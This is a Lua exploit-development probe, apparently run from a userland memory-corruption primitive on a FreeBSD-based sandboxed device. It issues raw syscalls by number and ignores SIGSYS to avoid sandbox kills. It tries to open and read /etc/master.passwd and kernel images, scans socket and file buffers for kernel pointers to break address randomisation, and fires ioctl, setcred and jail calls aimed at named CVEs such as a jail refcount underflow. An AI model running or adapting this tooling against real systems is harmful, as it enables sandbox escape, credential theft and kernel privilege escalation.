-- CRASH_CLASS: MODERATE
-- PROBE 392a: High-value BSD-native targets
--
-- [A] openat(499) — open files without Lua resolve() filter
-- [B] syscall 102 deep buffer scan — returns 160B of socket data
-- [C] FIOSSHMLPGCNF ioctl on shm fd — CVE-2026-58094 enabler
-- [D] setcred(591) test — FatGid CVE-2026-45250, long shot
-- [E] jail_set(507)/jail_get(506) — CVE-2026-49419 refcount underflow

print("=== PROBE 392a: BSD high-value targets ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

local function write_str(buf, s)
    zero_buf(buf, (#s + 8) - ((#s + 8) % 4))
    for i = 0, #s - 1, 4 do
        local dw = 0
        for j = 0, 3 do
            local idx = i + j + 1
            if idx <= #s then dw = dw + string.byte(s, idx) * (256 ^ j) end
        end
        wd(N(buf) + i, dw)
    end
end

-- Ignore SIGSYS
local act = memory.alloc(0x40)
zero_buf(act, 0x40)
wq(N(act), uint64(1))
pcall(function() mk(416)(uint64(12), act, uint64(0)) end)

local function scan_kptrs(base, len, label)
    local kptrs = 0
    local interesting = {}
    for off = 0, len - 8, 8 do
        local q = rq(N(base) + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                kptrs = kptrs + 1
                interesting[#interesting + 1] = string.format(
                    "  +0x%02X: 0x%X%08X *** KPTR ***", off, h, l)
            end
        end
    end
    if kptrs > 0 then
        print(string.format("  %s: %d kernel pointers!", label, kptrs))
        for _, line in ipairs(interesting) do print(line) end
    end
    return kptrs
end

-- ===================================================================
-- [A] openat(499) — AT_FDCWD=-100, various paths
-- ===================================================================
print("[A] openat(499)")

local sc499 = mk(499)
local AT_FDCWD = uint64(0xFFFFFF9C)  -- -100 as unsigned
local path_buf = memory.alloc(256)

local paths = {
    "/dev/null", "/dev/zero", "/dev/random",
    "/boot/kernel/kernel", "/boot/kernel/zfs.ko",
    "/proc/curproc/status", "/proc/curproc/map",
    "/etc/passwd", "/etc/master.passwd",
    "/system/common/lib/libkernel.sprx",
    "/mnt/sandbox", "/data",
    ".", "/", "/tmp",
}

for _, p in ipairs(paths) do
    if not alive() then break end
    write_str(path_buf, p)
    local ok, rv = pcall(function()
        return sc499(AT_FDCWD, path_buf, uint64(0), uint64(0))  -- O_RDONLY
    end)
    local ret = ok and N(rv) or -999
    if ret >= 0 then
        print(string.format("  openat(\"%s\"): fd=%d ***", p, ret))
        -- Read some data if it opened
        local rbuf = memory.alloc(256)
        zero_buf(rbuf, 256)
        local ok_r, rv_r = pcall(function()
            return mk(3)(uint64(ret), rbuf, uint64(256))
        end)
        local bytes = ok_r and N(rv_r) or 0
        if bytes > 0 then
            print(string.format("    read: %d bytes", bytes))
            scan_kptrs(rbuf, math.min(bytes, 256), p)
        end
        pcall(function() mk(6)(uint64(ret)) end)
    else
        -- Only print failures for interesting paths
        if p == "/boot/kernel/kernel" or p == "/proc/curproc/map" then
            print(string.format("  openat(\"%s\"): ret=%d", p, ret))
        end
    end
end

if not alive() then print("DEAD after [A]"); return end
print("")

-- ===================================================================
-- [B] syscall 102 deep buffer scan
-- ===================================================================
print("[B] syscall 102 (socket info)")

-- Create TCP socket
local tcp_fd = -1
local ok_t, rv_t = pcall(function()
    return mk(97)(uint64(2), uint64(1), uint64(0))  -- AF_INET SOCK_STREAM
end)
if ok_t then tcp_fd = N(rv_t) end

if tcp_fd >= 0 then
    -- Call 102 with larger buffer
    local buf102 = memory.alloc(0x400)
    -- Fill with sentinel
    for i = 0, 0x3FC, 4 do wd(N(buf102) + i, 0xDEADDEAD) end

    local ok_102, rv_102 = pcall(function()
        return mk(102)(uint64(tcp_fd), buf102, uint64(0x400))
    end)
    local ret_102 = ok_102 and N(rv_102) or -999
    print(string.format("  102(tcp, buf, 0x400): ret=%d", ret_102))

    -- Count modified dwords and dump
    local mod_count = 0
    local last_mod = 0
    for off = 0, 0x3FC, 4 do
        local d = rd(N(buf102) + off)
        if d ~= 0xDEADDEAD then
            mod_count = mod_count + 1
            last_mod = off
        end
    end
    print(string.format("  modified: %d dwords (last at +0x%X)", mod_count, last_mod))

    -- Dump first 256 bytes
    local hex = {}
    for off = 0, math.min(last_mod + 16, 0xFF), 4 do
        local d = rd(N(buf102) + off)
        if off % 32 == 0 then
            if #hex > 0 then
                print("  " .. string.format("+%03X: ", off - 32) .. table.concat(hex, " "))
            end
            hex = {}
        end
        hex[#hex + 1] = string.format("%08X", d or 0)
    end
    if #hex > 0 then
        local base = (math.min(last_mod + 16, 0xFF)) - (#hex - 1) * 4
        -- Just print remaining
        print("  +" .. string.format("%03X: ", base - base % 32) .. table.concat(hex, " "))
    end

    -- Scan for kernel pointers
    scan_kptrs(buf102, last_mod + 8, "sc102")

    -- Also try with UDP socket
    local udp_fd = -1
    local ok_u, rv_u = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(0))  -- AF_INET SOCK_DGRAM
    end)
    if ok_u then udp_fd = N(rv_u) end
    if udp_fd >= 0 then
        for i = 0, 0x3FC, 4 do wd(N(buf102) + i, 0xDEADDEAD) end
        local ok_u2, rv_u2 = pcall(function()
            return mk(102)(uint64(udp_fd), buf102, uint64(0x400))
        end)
        local mod_u = 0
        for off = 0, 0x3FC, 4 do
            if rd(N(buf102) + off) ~= 0xDEADDEAD then mod_u = mod_u + 1 end
        end
        print(string.format("  102(udp, buf, 0x400): ret=%d, mod=%d", ok_u2 and N(rv_u2) or -999, mod_u))
        scan_kptrs(buf102, 0x200, "sc102-udp")
        pcall(function() mk(6)(uint64(udp_fd)) end)
    end

    -- Try with RAW socket
    local raw_fd = -1
    local ok_r, rv_r = pcall(function()
        return mk(97)(uint64(2), uint64(3), uint64(255))  -- AF_INET SOCK_RAW IPPROTO_RAW
    end)
    if ok_r then raw_fd = N(rv_r) end
    if raw_fd >= 0 then
        for i = 0, 0x3FC, 4 do wd(N(buf102) + i, 0xDEADDEAD) end
        pcall(function() mk(102)(uint64(raw_fd), buf102, uint64(0x400)) end)
        local mod_r = 0
        for off = 0, 0x3FC, 4 do
            if rd(N(buf102) + off) ~= 0xDEADDEAD then mod_r = mod_r + 1 end
        end
        print(string.format("  102(raw): mod=%d", mod_r))
        scan_kptrs(buf102, 0x200, "sc102-raw")
        pcall(function() mk(6)(uint64(raw_fd)) end)
    end

    pcall(function() mk(6)(uint64(tcp_fd)) end)
else
    print("  no TCP socket")
end

if not alive() then print("DEAD after [B]"); return end
print("")

-- ===================================================================
-- [C] FIOSSHMLPGCNF ioctl on shm fd
-- ===================================================================
print("[C] FIOSSHMLPGCNF ioctl on shm fd")

local shm_fd = -1
local ok_shm, rv_shm = pcall(function()
    return mk(482)(uint64(1), uint64(0x202), uint64(0x180))  -- SHM_ANON
end)
if ok_shm then shm_fd = N(rv_shm) end

if shm_fd >= 0 then
    -- FIOSSHMLPGCNF = _IOW('f', 135, struct shm_largepage_conf)
    -- Try different sizes for the struct: 4, 8, 12, 16 bytes
    -- _IOW encoding: 0x80000000 | (size << 16) | ('f' << 8) | 135
    local sizes = {4, 8, 12, 16}
    for _, sz in ipairs(sizes) do
        if not alive() then break end
        local ioctl_code = 0x80000000 + (sz * 0x10000) + 0x6687
        local conf = memory.alloc(16)
        zero_buf(conf, 16)
        wd(N(conf), 0)  -- psind = 0 (smallest superpage)
        local ok_io, rv_io = pcall(function()
            return mk(54)(uint64(shm_fd), uint64(ioctl_code), conf)
        end)
        local ret_io = ok_io and N(rv_io) or -999
        print(string.format("  ioctl(shm, 0x%08X, psind=0): ret=%d", ioctl_code, ret_io))
    end

    -- Also try FIOGSHMLPGCNF (_IOR variant — read the config)
    for _, sz in ipairs(sizes) do
        if not alive() then break end
        local ioctl_code = 0x40000000 + (sz * 0x10000) + 0x6687
        local conf = memory.alloc(16)
        for i = 0, 12, 4 do wd(N(conf) + i, 0xDEADDEAD) end
        local ok_io, rv_io = pcall(function()
            return mk(54)(uint64(shm_fd), uint64(ioctl_code), conf)
        end)
        local ret_io = ok_io and N(rv_io) or -999
        local d0 = rd(N(conf))
        if ret_io >= 0 or d0 ~= 0xDEADDEAD then
            print(string.format("  ioctl(shm, 0x%08X, GET): ret=%d d0=0x%X ***",
                ioctl_code, ret_io, d0 or 0))
        end
    end

    pcall(function() mk(6)(uint64(shm_fd)) end)
else
    print("  no shm fd")
end

if not alive() then print("DEAD after [C]"); return end
print("")

-- ===================================================================
-- [D] setcred(591) test — FatGid
-- ===================================================================
print("[D] setcred test")

-- setcred(flags, wcred_ptr, size) — if it exists
-- Try with zeros first (should return -1 EINVAL, not kill)
local ok_sc, rv_sc = pcall(function()
    return mk(591)(uint64(0), uint64(0), uint64(0))
end)
local ret_sc = ok_sc and N(rv_sc) or -999
print(string.format("  591(0,0,0): ret=%d %s", ret_sc,
    ret_sc == -999 and "(crash/nosys)" or ""))

-- Try with a minimal struct
if ret_sc ~= -999 and alive() then
    local wcred = memory.alloc(0x100)
    zero_buf(wcred, 0x100)
    -- struct setcred { int sc_flags; ... }
    -- Try SETCREDF_SUPP_GROUPS = 0x04 (just to see if it recognizes the struct)
    wd(N(wcred), 0x04)  -- sc_flags = SETCREDF_SUPP_GROUPS
    wd(N(wcred) + 4, 0)  -- sc_uid
    wd(N(wcred) + 8, 0)  -- sc_gid
    wd(N(wcred) + 12, 1) -- sc_supp_groups_nb = 1
    local ok_sc2, rv_sc2 = pcall(function()
        return mk(591)(uint64(0x04), wcred, uint64(0x100))
    end)
    print(string.format("  591(SUPP_GROUPS, wcred, 0x100): ret=%d",
        ok_sc2 and N(rv_sc2) or -999))
end

if not alive() then print("DEAD after [D]"); return end
print("")

-- ===================================================================
-- [E] jail_set(507) / jail_get(506) — CVE-2026-49419
-- ===================================================================
print("[E] jail syscalls")

-- jail_get(506): jail_get(iovp, niov, flags)
local ok_jg, rv_jg = pcall(function()
    return mk(506)(uint64(0), uint64(0), uint64(0))
end)
print(string.format("  jail_get(506, 0,0,0): ret=%d", ok_jg and N(rv_jg) or -999))

-- jail_set(507): jail_set(iovp, niov, flags)
local ok_js, rv_js = pcall(function()
    return mk(507)(uint64(0), uint64(0), uint64(0))
end)
print(string.format("  jail_set(507, 0,0,0): ret=%d", ok_js and N(rv_js) or -999))

-- jail_remove(508)
local ok_jr, rv_jr = pcall(function()
    return mk(508)(uint64(0))
end)
print(string.format("  jail_remove(508, 0): ret=%d", ok_jr and N(rv_jr) or -999))

-- jail(338)
local ok_j, rv_j = pcall(function()
    return mk(338)(uint64(0))
end)
print(string.format("  jail(338, 0): ret=%d", ok_j and N(rv_j) or -999))

if not alive() then print("DEAD after [E]"); return end
print("")

-- ===================================================================
-- [F] Bonus: rtprio_thread(466) deep check
-- ===================================================================
print("[F] rtprio_thread(466)")

local rtp = memory.alloc(16)
for i = 0, 12, 4 do wd(N(rtp) + i, 0xDEADDEAD) end

-- RTP_LOOKUP=0, tid=0 (self)
local ok_rt, rv_rt = pcall(function()
    return mk(466)(uint64(0), uint64(0), rtp)
end)
local ret_rt = ok_rt and N(rv_rt) or -999
local rt_type = rd(N(rtp))
local rt_prio = rd(N(rtp) + 4)
print(string.format("  rtprio_thread(LOOKUP, self): ret=%d type=0x%X prio=%d",
    ret_rt, rt_type or 0, rt_prio or 0))

if not alive() then print("DEAD"); return end
print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 392a COMPLETE ===")
